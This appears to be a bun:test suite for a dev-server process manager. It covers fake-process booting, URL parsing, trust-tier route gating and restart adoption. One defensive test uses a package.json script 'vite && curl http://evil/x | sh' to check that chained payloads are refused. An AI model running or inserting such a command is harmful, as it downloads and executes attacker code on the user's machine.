/**
 * devServer — the process manager extracted out of `server/ai/mcp/tools/
 * studio/referenceRender.ts` (Track L, `live-01`).
 *
 * No real subprocess is ever spawned here — `spawn` is always injected
 * (`DevServerOverrides`), the same seam `installDeps.test.ts`/
 * `deploy.test.ts` use for their fake processes/CLIs. `bootTimeoutMs` is set
 * to a few milliseconds in the timeout case so it never waits wall-clock time.
 *
 * Split, same as `deploy.test.ts`, into: primitive-level tests (boot
 * mechanics, reuse, teardown — exercised through `ensureDevServer`/
 * `startDevServer`/`getDevServerStatus`/`stopDevServer` directly with a fake
 * spawn) and route-level tests (the Tier-2 trust gate — the security
 * control, so tested through `tryServeStudioDevServer` itself, not just the
 * function it protects). `tryServeStudioDevServer`'s test-only fourth
 * argument lets the "gate passes, dev server actually starts" case run
 * through one real HTTP call too, per the work order's explicit "Done when"
 * criterion.
 */
import { afterEach, beforeEach, describe, expect, it } from 'bun:test'
import * as fs from 'node:fs'
import * as os from 'node:os'
import * as path from 'node:path'
import { STUDIO_PARENT_ORIGINS_ENV, STUDIO_PROJECT_KEY_ENV } from '@core/studio-runtime'
import { registeredMcpServerProjectKey } from '../../../ai/drivers/registeredMcpServers'
import {
  STUDIO_LIVE_BASE_PATH_ENV,
  ensureDevServer,
  forgetDevServersForTest,
  getDevServerStatus,
  startDevServer,
  stopDevServer,
  tryServeStudioDevServer,
  type DevServerOverrides,
} from '../devServer'
import { STUDIO_DEV_SERVER_STATE_DIR_ENV } from '../devServerRecords'
import { writeStudioMeta } from '../studioMeta'
import type { SpawnedProcessLike } from '../subprocessRunner'

function streamFromChunks(chunks: string[]): ReadableStream<Uint8Array> {
  const encoder = new TextEncoder()
  return new ReadableStream<Uint8Array>({
    start(controller) {
      for (const chunk of chunks) controller.enqueue(encoder.encode(chunk))
    },
  })
}

function emptyStream(): ReadableStream<Uint8Array> {
  return new ReadableStream<Uint8Array>({
    start() {
      // Never closes — simulates a dev server that keeps running (no EOF)
      // without ever printing a URL, so `pumpAndWatch` never resolves the
      // stream side; the boot-timeout race is what settles the test.
    },
  })
}

interface FakeProcessOptions {
  stdoutChunks?: string[]
}

/** A fake dev-server process. Like a real one it stays alive until it is killed — or until the test ends it with `exit(code)`, which is how a crash after `ready` is modelled. */
function makeFakeProcess(opts: FakeProcessOptions = {}): { proc: SpawnedProcessLike; wasKilled: () => boolean; exit: (code: number) => void } {
  let killed = false
  let resolveExited!: (code: number) => void
  const exited = new Promise<number>((resolve) => { resolveExited = resolve })

  const proc: SpawnedProcessLike = {
    stdout: opts.stdoutChunks ? streamFromChunks(opts.stdoutChunks) : emptyStream(),
    stderr: emptyStream(),
    exited,
    pid: 4242,
    kill: () => {
      killed = true
      resolveExited(-1)
    },
  }
  return { proc, wasKilled: () => killed, exit: (code: number) => resolveExited(code) }
}

function writePackageJson(dir: string, scripts: Record<string, string>): void {
  fs.mkdirSync(dir, { recursive: true })
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'fixture', scripts }))
}

function makeTmpDir(prefix: string): string {
  return fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), prefix)))
}

/**
 * Write a complete `ProjectProfile` (every field `ProjectProfileSchema`
 * requires — a partial object is dropped entirely by `readStudioMeta`'s
 * validation) with `appRoot` set to a nested path, same shape
 * `prototypeShell.test.ts`'s own `writeProfile` helper uses.
 */
function writeNestedAppRootProfile(dir: string, appRoot: string): void {
  writeStudioMeta(dir, {
    profile: {
      probeVersion: 2,
      appRoot,
      framework: 'unknown',
      pagesDir: 'pages',
      routeStyle: 'flat',
      entryFiles: [],
      packageManager: 'npm',
      styleToolchain: { tailwind: null, cssModules: true, sass: false, postcssConfigPath: null, cssInJs: null },
      componentPackages: [],
      aliases: {},
      warnings: [],
    },
  })
}

async function waitUntil(predicate: () => boolean, attempts = 200): Promise<void> {
  for (let i = 0; i < attempts; i += 1) {
    if (predicate()) return
    await Bun.sleep(5)
  }
  throw new Error('condition never became true')
}

// ---------------------------------------------------------------------------
// ensureDevServer — the blocking primitive `referenceRender.ts` consumes
// ---------------------------------------------------------------------------

// `live-11` — a ready entry writes a record to `STUDIO_DEV_SERVER_STATE_DIR`.
// Every test here reaches `'ready'` through a fake process, so without this
// the records would land in the repo's real `.tmp/dev-servers/`.
let stateDir: string
let previousStateDir: string | undefined

beforeEach(() => {
  stateDir = makeTmpDir('studio-devserver-state-')
  previousStateDir = process.env[STUDIO_DEV_SERVER_STATE_DIR_ENV]
  process.env[STUDIO_DEV_SERVER_STATE_DIR_ENV] = stateDir
})

afterEach(() => {
  if (previousStateDir === undefined) delete process.env[STUDIO_DEV_SERVER_STATE_DIR_ENV]
  else process.env[STUDIO_DEV_SERVER_STATE_DIR_ENV] = previousStateDir
  fs.rmSync(stateDir, { recursive: true, force: true })
})

describe('ensureDevServer', () => {
  it('boots the dev server and discovers its printed URL', async () => {
    const tmpDir = makeTmpDir('studio-devserver-boot-')
    writePackageJson(tmpDir, { dev: 'vite' })
    const { proc } = makeFakeProcess({ stdoutChunks: ['  VITE v5.0.0  ready\n', '  ➜  Local:   http://localhost:5173/\n'] })

    const result = await ensureDevServer(tmpDir, { spawn: () => proc })

    expect(result.ok).toBe(true)
    expect(result.ok && result.baseUrl).toBe('http://127.0.0.1:5173')
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('strips ANSI escape codes wrapped around the port before matching the URL — confirmed-necessary Vite v8 regression', async () => {
    const tmpDir = makeTmpDir('studio-devserver-ansi-')
    writePackageJson(tmpDir, { dev: 'vite' })
    // Vite v8 colorizes just the port digits: the ':' and the digits are
    // split by an escape sequence. Without stripping first, URL_PATTERN's
    // `:\d+` never matches.
    const { proc } = makeFakeProcess({
      stdoutChunks: ['  ➜  Local:   http://localhost:\x1b[1m5173\x1b[22m/\x1b[39m\n'],
    })

    const result = await ensureDevServer(tmpDir, { spawn: () => proc })

    expect(result.ok).toBe(true)
    expect(result.ok && result.baseUrl).toBe('http://127.0.0.1:5173')
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('discovers the same URL when the dev server prints CRLF — a Windows shell wrapper', async () => {
    const tmpDir = makeTmpDir('studio-devserver-crlf-')
    writePackageJson(tmpDir, { dev: 'vite' })
    // `URL_PATTERN`'s tail is `[^\s"'<>]*` and `\r` IS `\s`, so the `\r` can
    // never be swallowed into the host. Asserted rather than assumed: this is
    // the one subprocess reader under `server/` that matches against raw
    // CHUNKS instead of lines, so it is the one `splitLines` cannot protect.
    const { proc } = makeFakeProcess({ stdoutChunks: ['  VITE v5.0.0  ready\r\n', '  ➜  Local:   http://localhost:5173/\r\n'] })

    const result = await ensureDevServer(tmpDir, { spawn: () => proc })

    expect(result.ok).toBe(true)
    expect(result.ok && result.baseUrl).toBe('http://127.0.0.1:5173')
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('returns ok:false with the captured log when the dev server never prints a URL (boot timeout)', async () => {
    const tmpDir = makeTmpDir('studio-devserver-timeout-')
    writePackageJson(tmpDir, { dev: 'vite' })
    const { proc, wasKilled } = makeFakeProcess()

    const result = await ensureDevServer(tmpDir, { spawn: () => proc, bootTimeoutMs: 15 })

    expect(result.ok).toBe(false)
    expect(!result.ok && result.error.length > 0).toBe(true)
    expect(wasKilled()).toBe(true)
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('refuses to spawn anything but vite — a non-Vite dev/start script never runs, at any tier (sec-20)', async () => {
    const tmpDir = makeTmpDir('studio-devserver-notvite-')
    let spawnCount = 0
    const overrides: DevServerOverrides = {
      spawn: () => {
        spawnCount += 1
        return makeFakeProcess({ stdoutChunks: ['Local: http://localhost:5178/\n'] }).proc
      },
    }

    // A plain non-vite script, and a vite invocation with a payload chained after it (sec-21).
    for (const scripts of [{ start: 'node ./server.js' }, { dev: 'vite && curl http://evil/x | sh' }]) {
      writePackageJson(tmpDir, scripts)
      const result = await ensureDevServer(tmpDir, overrides)
      expect(result.ok).toBe(false)
      expect(!result.ok && result.error).toContain('vite')
      expect(spawnCount).toBe(0)
    }

    // The browser route reports it as a failed boot with the reason, not a spawn.
    expect(startDevServer(tmpDir, overrides).phase).toBe('failed')
    expect(spawnCount).toBe(0)

    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('returns ok:false with a clear message when package.json has no dev or start script', async () => {
    const tmpDir = makeTmpDir('studio-devserver-noscript-')
    writePackageJson(tmpDir, { build: 'vite build' })

    const result = await ensureDevServer(tmpDir, { spawn: () => makeFakeProcess().proc })

    expect(result.ok).toBe(false)
    expect(!result.ok && result.error).toContain('dev')
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('spawns the dev server with STUDIO_LIVE_BASE_PATH set to "/p/<projectKey>/" — the base path server/liveOrigin.ts and the generated vite.config.js template agree on (Part B, live-06)', async () => {
    const tmpDir = makeTmpDir('studio-devserver-baseenv-')
    writePackageJson(tmpDir, { dev: 'vite' })
    let capturedEnv: Record<string, string> | undefined
    const overrides: DevServerOverrides = {
      spawn: (_argv, options) => {
        capturedEnv = options.env
        return makeFakeProcess({ stdoutChunks: ['Local: http://localhost:5173/\n'] }).proc
      },
    }

    await ensureDevServer(tmpDir, overrides)

    // registeredMcpServerProjectKey must be computed from the ORIGINAL
    // project dir passed to ensureDevServer, not the (here identical, but in
    // a monorepo DIFFERENT) resolved app root — see devServer.ts's
    // spawnEntry doc.
    const expectedProjectKey = registeredMcpServerProjectKey(tmpDir)
    expect(capturedEnv?.[STUDIO_LIVE_BASE_PATH_ENV]).toBe(`/p/${expectedProjectKey}/`)
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('injects STUDIO_PROJECT_KEY_ENV, the same projectKey the base-path env var uses (live-08, virtual:studio-runtime)', async () => {
    const tmpDir = makeTmpDir('studio-devserver-projectkey-')
    writePackageJson(tmpDir, { dev: 'vite' })
    let capturedEnv: Record<string, string> | undefined
    const overrides: DevServerOverrides = {
      spawn: (_argv, options) => {
        capturedEnv = options.env
        return makeFakeProcess({ stdoutChunks: ['Local: http://localhost:5173/\n'] }).proc
      },
    }

    await ensureDevServer(tmpDir, overrides)

    const expectedProjectKey = registeredMcpServerProjectKey(tmpDir)
    expect(capturedEnv?.[STUDIO_PROJECT_KEY_ENV]).toBe(expectedProjectKey)
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('injects STUDIO_PARENT_ORIGINS_ENV as the live frame-ancestor list — PUBLIC_ORIGIN when set, and always the admin and dev origins (live-08, virtual:studio-runtime)', async () => {
    const tmpDir = makeTmpDir('studio-devserver-parentorigin-')
    writePackageJson(tmpDir, { dev: 'vite' })
    const originalPublicOrigin = process.env.PUBLIC_ORIGIN

    try {
      process.env.PUBLIC_ORIGIN = 'https://studio.example.com'
      let capturedEnvWithOrigin: Record<string, string> | undefined
      await ensureDevServer(tmpDir, {
        spawn: (_argv, options) => {
          capturedEnvWithOrigin = options.env
          return makeFakeProcess({ stdoutChunks: ['Local: http://localhost:5173/\n'] }).proc
        },
      })
      const withOrigin = (capturedEnvWithOrigin?.[STUDIO_PARENT_ORIGINS_ENV] ?? '').split(',')
      expect(withOrigin).toContain('https://studio.example.com')
      expect(withOrigin).toContain(`http://127.0.0.1:${process.env.PORT ?? 3001}`)
      stopDevServer(tmpDir)

      delete process.env.PUBLIC_ORIGIN
      let capturedEnvWithoutOrigin: Record<string, string> | undefined
      await ensureDevServer(tmpDir, {
        spawn: (_argv, options) => {
          capturedEnvWithoutOrigin = options.env
          return makeFakeProcess({ stdoutChunks: ['Local: http://localhost:5174/\n'] }).proc
        },
      })
      const withoutOrigin = (capturedEnvWithoutOrigin?.[STUDIO_PARENT_ORIGINS_ENV] ?? '').split(',')
      expect(withoutOrigin).not.toContain('https://studio.example.com')
      expect(withoutOrigin).toContain(`http://127.0.0.1:${process.env.PORT ?? 3001}`)
      expect(withoutOrigin).toContain('http://localhost:5173')
    } finally {
      if (originalPublicOrigin === undefined) delete process.env.PUBLIC_ORIGIN
      else process.env.PUBLIC_ORIGIN = originalPublicOrigin
      stopDevServer(tmpDir)
      fs.rmSync(tmpDir, { recursive: true, force: true })
    }
  })

  it('computes STUDIO_LIVE_BASE_PATH\'s projectKey from the ORIGINAL project dir, not the narrowed (monorepo) app root — getting this backwards would silently mismatch server/liveOrigin.ts\'s own /p/<projectKey> routing key for every nested project', async () => {
    const tmpDir = makeTmpDir('studio-devserver-monorepo-')
    fs.mkdirSync(path.join(tmpDir, 'apps', 'web'), { recursive: true })
    writePackageJson(path.join(tmpDir, 'apps', 'web'), { dev: 'vite' })
    writeNestedAppRootProfile(tmpDir, 'apps/web')

    let capturedEnv: Record<string, string> | undefined
    const overrides: DevServerOverrides = {
      spawn: (_argv, options) => {
        capturedEnv = options.env
        return makeFakeProcess({ stdoutChunks: ['Local: http://localhost:5175/\n'] }).proc
      },
    }

    const result = await ensureDevServer(tmpDir, overrides)

    // The spawn itself did run in the nested app root (that part of the
    // existing appRoot-resolution behavior is unchanged)...
    expect(result.ok).toBe(true)
    // ...but the base-path key is derived from `tmpDir` (the project
    // directory), never from `tmpDir/apps/web` (the resolved app root).
    const projectKey = registeredMcpServerProjectKey(tmpDir)
    const wrongKey = registeredMcpServerProjectKey(path.join(tmpDir, 'apps', 'web'))
    expect(projectKey).not.toBe(wrongKey)
    expect(capturedEnv?.[STUDIO_LIVE_BASE_PATH_ENV]).toBe(`/p/${projectKey}/`)
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('reuses the same dev server across calls for the same project (no second spawn)', async () => {
    const tmpDir = makeTmpDir('studio-devserver-reuse-')
    writePackageJson(tmpDir, { dev: 'vite' })
    let spawnCount = 0
    const overrides: DevServerOverrides = {
      spawn: () => {
        spawnCount += 1
        return makeFakeProcess({ stdoutChunks: ['Local: http://localhost:5174/\n'] }).proc
      },
    }

    await ensureDevServer(tmpDir, overrides)
    await ensureDevServer(tmpDir, overrides)

    expect(spawnCount).toBe(1)
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })
})

// ---------------------------------------------------------------------------
// The non-blocking primitives — status/start/stop
// ---------------------------------------------------------------------------

describe('getDevServerStatus / startDevServer / stopDevServer', () => {
  it('reports stopped for a project with no entry', () => {
    const tmpDir = makeTmpDir('studio-devserver-stopped-')
    expect(getDevServerStatus(tmpDir)).toEqual({ phase: 'stopped', pid: null, startedAt: null, log: '' })
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('start returns immediately without waiting for boot, then status observes the ready transition', async () => {
    const tmpDir = makeTmpDir('studio-devserver-start-')
    writePackageJson(tmpDir, { dev: 'vite' })
    let spawnCount = 0
    const overrides: DevServerOverrides = {
      spawn: () => {
        spawnCount += 1
        return makeFakeProcess({ stdoutChunks: ['Local: http://localhost:5175/\n'] }).proc
      },
    }

    const started = startDevServer(tmpDir, overrides)
    expect(started.phase === 'booting' || started.phase === 'ready').toBe(true)
    expect(spawnCount).toBe(1)

    await waitUntil(() => getDevServerStatus(tmpDir).phase === 'ready')
    // A second start while already ready must not spawn again.
    startDevServer(tmpDir, overrides)
    expect(spawnCount).toBe(1)

    stopDevServer(tmpDir)
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('retains a failed boot in the registry so status can show its log, then clears it on the next start', async () => {
    const tmpDir = makeTmpDir('studio-devserver-failed-')
    writePackageJson(tmpDir, { dev: 'vite' })
    let spawnCount = 0
    const overrides: DevServerOverrides = {
      spawn: () => {
        spawnCount += 1
        return makeFakeProcess().proc
      },
      bootTimeoutMs: 10,
    }

    startDevServer(tmpDir, overrides)
    await waitUntil(() => getDevServerStatus(tmpDir).phase === 'failed')
    expect(getDevServerStatus(tmpDir).log).toBeDefined()

    // Next start attempt clears the failed entry and spawns fresh.
    startDevServer(tmpDir, overrides)
    expect(spawnCount).toBe(2)

    stopDevServer(tmpDir)
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('a dev server that exits AFTER it was ready reports failed with the exit in its log, and the next start respawns', async () => {
    const tmpDir = makeTmpDir('studio-devserver-crash-')
    writePackageJson(tmpDir, { dev: 'vite' })
    const fakes: ReturnType<typeof makeFakeProcess>[] = []
    const overrides: DevServerOverrides = {
      spawn: () => {
        const fake = makeFakeProcess({ stdoutChunks: ['Local: http://localhost:5177/\n'] })
        fakes.push(fake)
        return fake.proc
      },
    }

    startDevServer(tmpDir, overrides)
    await waitUntil(() => getDevServerStatus(tmpDir).phase === 'ready')

    // Vite crashing on an HMR socket reset, or the user killing it from a terminal.
    fakes[0]!.exit(1)
    await waitUntil(() => getDevServerStatus(tmpDir).phase === 'failed')
    expect(getDevServerStatus(tmpDir).log).toContain('exited with code 1 after it was ready')

    // The proxy must stop forwarding to the dead port, and a start respawns.
    startDevServer(tmpDir, overrides)
    expect(fakes).toHaveLength(2)
    await waitUntil(() => getDevServerStatus(tmpDir).phase === 'ready')

    stopDevServer(tmpDir)
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('stop kills a running process and resets status to stopped; stopping twice is a no-op', async () => {
    const tmpDir = makeTmpDir('studio-devserver-stop-')
    writePackageJson(tmpDir, { dev: 'vite' })
    const { proc, wasKilled } = makeFakeProcess({ stdoutChunks: ['Local: http://localhost:5176/\n'] })

    startDevServer(tmpDir, { spawn: () => proc })
    await waitUntil(() => getDevServerStatus(tmpDir).phase === 'ready')

    expect(stopDevServer(tmpDir)).toEqual({ phase: 'stopped', pid: null, startedAt: null, log: '' })
    expect(wasKilled()).toBe(true)
    expect(getDevServerStatus(tmpDir)).toEqual({ phase: 'stopped', pid: null, startedAt: null, log: '' })
    // Idempotent.
    expect(stopDevServer(tmpDir)).toEqual({ phase: 'stopped', pid: null, startedAt: null, log: '' })
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })
})

// ---------------------------------------------------------------------------
// tryServeStudioDevServer — the trust gate, tested through the route
// ---------------------------------------------------------------------------

function call(pathAndQuery: string, init?: RequestInit, overrides?: DevServerOverrides): Promise<Response | null> {
  const url = new URL(`http://localhost${pathAndQuery}`)
  return tryServeStudioDevServer(new Request(url, init), url, url.pathname, overrides)
}

function post(body: unknown): RequestInit {
  return { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }
}

describe('tryServeStudioDevServer', () => {
  it('does not claim routes it does not own', async () => {
    const res = await call('/admin/api/studio/deploy/status')
    expect(res).toBeNull()
  })

  it('refuses GET status at Tier 0 (static)', async () => {
    const tmpDir = makeTmpDir('studio-devserver-route-status-refuse-')
    fs.mkdirSync(tmpDir, { recursive: true })
    writeStudioMeta(tmpDir, { trust: 'static' })

    const res = await call(`/admin/api/studio/dev-server/status?dir=${encodeURIComponent(tmpDir)}`)

    expect(res?.status).toBe(409)
    const body = (await res!.json()) as { code: string; error: string }
    expect(body.code).toBe('trust-tier-required')
    expect(body.error).toContain('run-project')
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('refuses POST start at Tier 1 (render-packages) too — never touches the spawner', async () => {
    const tmpDir = makeTmpDir('studio-devserver-route-start-refuse-')
    fs.mkdirSync(tmpDir, { recursive: true })
    writeStudioMeta(tmpDir, { trust: 'render-packages' })
    let spawned = false

    const res = await call(
      '/admin/api/studio/dev-server/start',
      post({ dir: tmpDir }),
      { spawn: () => { spawned = true; return makeFakeProcess().proc } },
    )

    expect(res?.status).toBe(409)
    expect(spawned).toBe(false)
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('at Tier 2, POST start returns booting and GET status observes ready against a fake dev server', async () => {
    const tmpDir = makeTmpDir('studio-devserver-route-ready-')
    writePackageJson(tmpDir, { dev: 'vite' })
    writeStudioMeta(tmpDir, { trust: 'run-project' })

    const startRes = await call(
      '/admin/api/studio/dev-server/start',
      post({ dir: tmpDir }),
      { spawn: () => makeFakeProcess({ stdoutChunks: ['Local: http://localhost:5177/\n'] }).proc },
    )
    expect(startRes?.status).toBe(200)
    const startBody = (await startRes!.json()) as { phase: string }
    expect(['booting', 'ready']).toContain(startBody.phase)

    let statusBody: { phase: string } = { phase: '' }
    for (let attempt = 0; attempt < 200; attempt += 1) {
      const res = await call(`/admin/api/studio/dev-server/status?dir=${encodeURIComponent(tmpDir)}`)
      statusBody = (await res!.json()) as { phase: string }
      if (statusBody.phase === 'ready') break
      await Bun.sleep(5)
    }
    expect(statusBody.phase).toBe('ready')

    // stop is ungated — still Tier 2 here, but confirm it never checks trust.
    const stopRes = await call('/admin/api/studio/dev-server/stop', post({ dir: tmpDir }))
    expect(stopRes?.status).toBe(200)
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('POST stop is never gated — works even at Tier 0', async () => {
    const tmpDir = makeTmpDir('studio-devserver-route-stop-ungated-')
    fs.mkdirSync(tmpDir, { recursive: true })

    const res = await call('/admin/api/studio/dev-server/stop', post({ dir: tmpDir }))

    expect(res?.status).toBe(200)
    const body = (await res!.json()) as { phase: string }
    expect(body.phase).toBe('stopped')
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })
})

// `live-11` — a ready dev server outlives this process and is adopted back.
describe('dev-server records — adoption across a server restart', () => {
  const READY_CHUNKS = ['  VITE v5.0.0  ready\n', '  ➜  Local:   http://localhost:5173/\n']

  function recordFiles(): string[] {
    return fs.existsSync(stateDir) ? fs.readdirSync(stateDir).filter((f) => f.endsWith('.json')) : []
  }

  it('writes a record once ready, and stop removes it', async () => {
    const tmpDir = makeTmpDir('studio-devserver-record-')
    writePackageJson(tmpDir, { dev: 'vite' })
    const { proc, wasKilled } = makeFakeProcess({ stdoutChunks: READY_CHUNKS })

    const result = await ensureDevServer(tmpDir, { spawn: () => proc })
    expect(result.ok).toBe(true)
    expect(recordFiles()).toHaveLength(1)
    const record = JSON.parse(fs.readFileSync(path.join(stateDir, recordFiles()[0]), 'utf8')) as { pid: number; baseUrl: string }
    expect(record).toMatchObject({ pid: 4242, baseUrl: 'http://127.0.0.1:5173' })

    stopDevServer(tmpDir)
    expect(wasKilled()).toBe(true)
    expect(recordFiles()).toHaveLength(0)
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('after a restart, adopts the recorded server instead of spawning a second one', async () => {
    const tmpDir = makeTmpDir('studio-devserver-adopt-')
    writePackageJson(tmpDir, { dev: 'vite' })
    const first = makeFakeProcess({ stdoutChunks: READY_CHUNKS })
    expect((await ensureDevServer(tmpDir, { spawn: () => first.proc })).ok).toBe(true)

    // The process restarts: the registry is gone, the child and its record are
    // not. (No status poll here — a poll adopts with the DEFAULT checks, and
    // the fake's pid 4242 is not a live process on this machine.)
    forgetDevServersForTest()

    let spawned = 0
    const probed: string[] = []
    const result = await ensureDevServer(tmpDir, {
      spawn: () => {
        spawned += 1
        return makeFakeProcess({ stdoutChunks: READY_CHUNKS }).proc
      },
      isProcessAlive: (pid) => pid === 4242,
      probe: async (baseUrl, basePath) => {
        probed.push(`${baseUrl}${basePath}`)
        return true
      },
    })
    expect(result.ok).toBe(true)
    expect(result.ok && result.baseUrl).toBe('http://127.0.0.1:5173')
    expect(spawned).toBe(0)
    expect(probed).toHaveLength(1)
    expect(probed[0]).toMatch(/^http:\/\/127\.0\.0\.1:5173\/p\/[^/]+\/$/)
    const status = getDevServerStatus(tmpDir)
    expect(status.phase).toBe('ready')
    expect(status.pid).toBe(4242)
    expect(status.log).toContain('adopted')
    expect(first.wasKilled()).toBe(false)

    // Stop signals the adopted pid only through the record's own kill path — nothing else to assert here without a real process, but the record must go.
    stopDevServer(tmpDir)
    expect(recordFiles()).toHaveLength(0)
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('a plain status poll after a restart adopts the recorded server too — the proxy never has to wait for a start call', async () => {
    const tmpDir = makeTmpDir('studio-devserver-poll-')
    writePackageJson(tmpDir, { dev: 'vite' })
    expect((await ensureDevServer(tmpDir, { spawn: () => makeFakeProcess({ stdoutChunks: READY_CHUNKS }).proc })).ok).toBe(true)
    forgetDevServersForTest()

    // No overrides reach a status poll, so the default checks run: the fake
    // pid 4242 is not a live process on this machine, and adoption must say
    // so by discarding the record rather than answering 'ready' for a ghost.
    expect(getDevServerStatus(tmpDir).phase).toBe('stopped')
    expect(recordFiles()).toHaveLength(0)
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('a status poll adopts a recorded server whose pid is alive — it is this process\'s own pid here', async () => {
    const tmpDir = makeTmpDir('studio-devserver-poll-live-')
    writePackageJson(tmpDir, { dev: 'vite' })
    const alive = makeFakeProcess({ stdoutChunks: READY_CHUNKS })
    // The fake process reports pid 4242; rewrite the record to a pid that IS alive so the default check passes.
    expect((await ensureDevServer(tmpDir, { spawn: () => alive.proc })).ok).toBe(true)
    const file = path.join(stateDir, recordFiles()[0])
    const record = JSON.parse(fs.readFileSync(file, 'utf8')) as Record<string, unknown>
    // …and to an origin nothing listens on, so the default probe's answer does
    // not depend on whatever dev server happens to be running on this machine.
    fs.writeFileSync(file, JSON.stringify({ ...record, pid: process.pid, baseUrl: 'http://127.0.0.1:1' }), 'utf8')
    forgetDevServersForTest()

    // Adoption starts on the poll (phase 'booting' while the default probe
    // runs against a port nothing listens on), and the probe's failure is a
    // failed boot — never a spawn, never 'ready' for an origin that is gone.
    expect(getDevServerStatus(tmpDir).phase).toBe('booting')
    await waitUntil(() => getDevServerStatus(tmpDir).phase !== 'booting')
    expect(getDevServerStatus(tmpDir).phase).toBe('failed')
    expect(recordFiles()).toHaveLength(0)
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('a record whose pid is gone is discarded and a fresh server is spawned', async () => {
    const tmpDir = makeTmpDir('studio-devserver-dead-')
    writePackageJson(tmpDir, { dev: 'vite' })
    expect((await ensureDevServer(tmpDir, { spawn: () => makeFakeProcess({ stdoutChunks: READY_CHUNKS }).proc })).ok).toBe(true)
    forgetDevServersForTest()

    let spawned = 0
    const result = await ensureDevServer(tmpDir, {
      spawn: () => {
        spawned += 1
        return makeFakeProcess({ stdoutChunks: READY_CHUNKS }).proc
      },
      isProcessAlive: () => false,
      probe: async () => {
        throw new Error('must not probe a dead pid')
      },
    })
    expect(result.ok).toBe(true)
    expect(spawned).toBe(1)
    expect(recordFiles()).toHaveLength(1)
    stopDevServer(tmpDir)
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })

  it('a record whose origin no longer answers fails the adoption like a bad boot, then the next start spawns fresh', async () => {
    const tmpDir = makeTmpDir('studio-devserver-stale-')
    writePackageJson(tmpDir, { dev: 'vite' })
    expect((await ensureDevServer(tmpDir, { spawn: () => makeFakeProcess({ stdoutChunks: READY_CHUNKS }).proc })).ok).toBe(true)
    forgetDevServersForTest()

    const stale = await ensureDevServer(tmpDir, {
      spawn: () => {
        throw new Error('adoption must be attempted before any spawn')
      },
      isProcessAlive: () => true,
      probe: async () => false,
    })
    expect(stale.ok).toBe(false)
    expect(getDevServerStatus(tmpDir).phase).toBe('failed')
    expect(recordFiles()).toHaveLength(0)

    let spawned = 0
    const fresh = await ensureDevServer(tmpDir, {
      spawn: () => {
        spawned += 1
        return makeFakeProcess({ stdoutChunks: READY_CHUNKS }).proc
      },
    })
    expect(fresh.ok).toBe(true)
    expect(spawned).toBe(1)
    stopDevServer(tmpDir)
    fs.rmSync(tmpDir, { recursive: true, force: true })
  })
})
